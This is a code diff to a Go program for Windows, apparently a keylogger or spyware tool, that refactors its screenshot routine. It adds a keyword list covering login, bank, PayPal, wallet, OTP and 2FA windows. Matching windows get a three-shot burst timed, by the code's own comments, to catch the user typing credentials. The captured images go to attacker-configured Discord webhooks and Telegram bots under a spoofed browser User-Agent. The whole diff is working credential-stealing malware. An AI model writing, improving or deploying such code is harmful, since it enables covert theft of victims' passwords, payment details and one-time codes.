@@ -885,115 +885,135 @@ func (l *Logger) checkScreenshotTrigger(win string, isImmediate bool) {
 	go l.takeAndSendScreenshot(win)
 }
 
-// takeAndSendScreenshot encodes a heavily compressed JPEG natively and ships it directly via Multipart POST.
-// It takes a batch of 3 screenshots spaced 2.5 seconds apart to capture login flow context.
+// isSensitiveWindow checks if a window title contains login/auth keywords.
+// Sensitive windows warrant a multi-shot batch capture to record the full interaction.
+func isSensitiveWindow(winLower string) bool {
+	sensitiveKW := []string{"login", "sign in", "signin", "log in", "password", "bank", "paypal",
+		"checkout", "auth", "credential", "verify", "account", "billing", "submit", "secure",
+		"wallet", "payment", "transfer", "otp", "2fa", "two-factor"}
+	for _, kw := range sensitiveKW {
+		if strings.Contains(winLower, kw) {
+			return true
+		}
+	}
+	return false
+}
+
+// captureAndSend captures the current screen state and sends it to all configured channels.
+// Returns true on success. Uses a pooled buffer to avoid heap allocations.
+func (l *Logger) captureAndSend(win, ts string, shotNum, total int) {
+	n := screenshot.NumActiveDisplays()
+	if n <= 0 {
+		return
+	}
+
+	var bounds image.Rectangle
+	hwnd, _, _ := procGetForeground.Call()
+	if hwnd != 0 {
+		var rect RECT
+		ret, _, _ := procGetWindowRect.Call(hwnd, uintptr(unsafe.Pointer(&rect)))
+		if ret != 0 {
+			bounds = image.Rect(int(rect.Left), int(rect.Top), int(rect.Right), int(rect.Bottom))
+		}
+	}
+	if bounds.Empty() {
+		bounds = screenshot.GetDisplayBounds(0)
+	}
+	if bounds.Empty() {
+		return
+	}
+
+	img, err := screenshot.CaptureRect(bounds)
+	if err != nil {
+		return
+	}
+
+	buf := screenshotBufPool.Get().(*bytes.Buffer)
+	buf.Reset()
+	if err = jpeg.Encode(buf, img, &jpeg.Options{Quality: 60}); err != nil {
+		screenshotBufPool.Put(buf)
+		return
+	}
+
+	// Copy bytes out of pool buffer so we can safely return it after network calls.
+	imageData := make([]byte, buf.Len())
+	copy(imageData, buf.Bytes())
+	screenshotBufPool.Put(buf)
+
+	client := sharedHTTPClient
+	label := ts
+	if total > 1 {
+		label = fmt.Sprintf("%s [%d/%d]", ts, shotNum, total)
+	}
+
+	// Discord
+	if l.Config.WebhookURL != "" {
+		body := &bytes.Buffer{}
+		writer := multipart.NewWriter(body)
+		if part, err := writer.CreateFormFile("file1", "capture.jpeg"); err == nil {
+			part.Write(imageData)
+		}
+		writer.WriteField("content", fmt.Sprintf("📸 **Context Capture** `[%s]`\nWindow: `%s`", label, win))
+		writer.Close()
+		req, _ := http.NewRequest("POST", l.Config.WebhookURL, body)
+		req.Header.Set("Content-Type", writer.FormDataContentType())
+		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+		client.Do(req)
+	}
+
+	// Telegram
+	if l.Config.TelegramToken != "" && l.Config.TelegramChatID != "" {
+		body := &bytes.Buffer{}
+		writer := multipart.NewWriter(body)
+		writer.WriteField("chat_id", l.Config.TelegramChatID)
+		writer.WriteField("caption", fmt.Sprintf("📸 *Context Capture* `[%s]`\nWindow: `%s`", label, win))
+		writer.WriteField("parse_mode", "Markdown")
+		if part, err := writer.CreateFormFile("photo", "capture.jpeg"); err == nil {
+			part.Write(imageData)
+		}
+		writer.Close()
+		url := fmt.Sprintf("https://api.telegram.org/bot%s/sendPhoto", l.Config.TelegramToken)
+		req, _ := http.NewRequest("POST", url, body)
+		req.Header.Set("Content-Type", writer.FormDataContentType())
+		client.Do(req)
+	}
+}
+
+// takeAndSendScreenshot intelligently decides the capture strategy:
+//   - Sensitive/auth windows (login, bank, payment, etc.) → 3-shot burst (form → typing → result)
+//   - Everything else → single shot (zero spam)
+//
+// A concurrent guard prevents overlapping batches from running simultaneously.
 func (l *Logger) takeAndSendScreenshot(win string) {
-	// Prevent concurrent overlapping batches
+	// Prevent concurrent overlapping batches.
 	if !l.takingScreenshot.CompareAndSwap(false, true) {
 		return
 	}
 	defer l.takingScreenshot.Store(false)
 
-	for i := 0; i < 3; i++ {
-		if i == 0 {
-			// Slight delay for the first capture to allow the target page/window to render visually
-			time.Sleep(800 * time.Millisecond)
-		} else {
-			// Delay between subsequent batch captures
-			time.Sleep(2500 * time.Millisecond)
-		}
+	winLower := strings.ToLower(win)
+	sensitive := isSensitiveWindow(winLower)
 
-		n := screenshot.NumActiveDisplays()
-		if n <= 0 {
-			return
-		}
-
-		var bounds image.Rectangle
-		// 1. TRY WINDOW BRACKETING: Only capture the active window for efficiency.
-		hwnd, _, _ := procGetForeground.Call()
-		if hwnd != 0 {
-			var rect RECT
-			ret, _, _ := procGetWindowRect.Call(hwnd, uintptr(unsafe.Pointer(&rect)))
-			if ret != 0 {
-				bounds = image.Rect(int(rect.Left), int(rect.Top), int(rect.Right), int(rect.Bottom))
-			}
-		}
-
-		// 2. FALLBACK: Full screen if window rect fails or is empty
-		if bounds.Empty() {
-			bounds = screenshot.GetDisplayBounds(0)
-		}
-
-		if bounds.Empty() {
-			continue
-		}
-
-		img, err := screenshot.CaptureRect(bounds)
-		if err != nil {
-			continue
-		}
-
-		// Use pooled buffer to avoid repeated heap allocations.
-		buf := screenshotBufPool.Get().(*bytes.Buffer)
-		buf.Reset()
-
-		// Encode 60% quality JPEG — good balance of clarity and size.
-		err = jpeg.Encode(buf, img, &jpeg.Options{Quality: 60})
-		if err != nil {
-			screenshotBufPool.Put(buf)
-			continue
-		}
-		
-		imageData := buf.Bytes()
-		// DO NOT return buf to screenshotBufPool here!
-		// buf.Bytes() returns a slice of the underlying array, NOT a copy!
-		// Returning it now would allow the next screenshot in the batch 
-		// to overwrite imageData before the network requests finish.
-		
-		client := sharedHTTPClient
+	if sensitive {
+		// Burst mode: 3 shots spaced 2.5s apart to capture form → typing → submission result.
+		// Shot 1: initial page state (form visible)
+		time.Sleep(700 * time.Millisecond)
 		ts := time.Now().Format("15:04:05")
+		l.captureAndSend(win, ts, 1, 3)
 
-		// 1. Stream RAM buffer to Discord multipart
-		if l.Config.WebhookURL != "" {
-			body := &bytes.Buffer{}
-			writer := multipart.NewWriter(body)
-			
-			part, err := writer.CreateFormFile("file1", fmt.Sprintf("capture_batch_%d.jpeg", i+1))
-			if err == nil {
-				part.Write(imageData)
-			}
-			
-			writer.WriteField("content", fmt.Sprintf("📸 **Context Capture (%d/3)** `[%s]`\nWindow: `%s`", i+1, ts, win))
-			writer.Close()
+		// Shot 2: mid-interaction (user typing credentials)
+		time.Sleep(2500 * time.Millisecond)
+		ts = time.Now().Format("15:04:05")
+		l.captureAndSend(win, ts, 2, 3)
 
-			req, _ := http.NewRequest("POST", l.Config.WebhookURL, body)
-			req.Header.Set("Content-Type", writer.FormDataContentType())
-			req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
-			client.Do(req)
-		}
-
-		// 2. Stream RAM buffer to Telegram multipart
-		if l.Config.TelegramToken != "" && l.Config.TelegramChatID != "" {
-			body := &bytes.Buffer{}
-			writer := multipart.NewWriter(body)
-
-			writer.WriteField("chat_id", l.Config.TelegramChatID)
-			writer.WriteField("caption", fmt.Sprintf("📸 *Context Capture (%d/3)* `[%s]`\nWindow: `%s`", i+1, ts, win))
-			writer.WriteField("parse_mode", "Markdown")
-			
-			part, err := writer.CreateFormFile("photo", fmt.Sprintf("capture_batch_%d.jpeg", i+1))
-			if err == nil {
-				part.Write(imageData)
-			}
-			writer.Close()
-
-			url := fmt.Sprintf("https://api.telegram.org/bot%s/sendPhoto", l.Config.TelegramToken)
-			req, _ := http.NewRequest("POST", url, body)
-			req.Header.Set("Content-Type", writer.FormDataContentType())
-			client.Do(req)
-		}
-		
-		// NOW it is safe to return the buffer to the pool
-		screenshotBufPool.Put(buf)
+		// Shot 3: post-submission result (success/error/redirect)
+		time.Sleep(2500 * time.Millisecond)
+		ts = time.Now().Format("15:04:05")
+		l.captureAndSend(win, ts, 3, 3)
+	} else {
+		// Single-shot mode: one focused capture, no spam.
+		time.Sleep(800 * time.Millisecond)
+		ts := time.Now().Format("15:04:05")
+		l.captureAndSend(win, ts, 1, 1)
 	}
 }
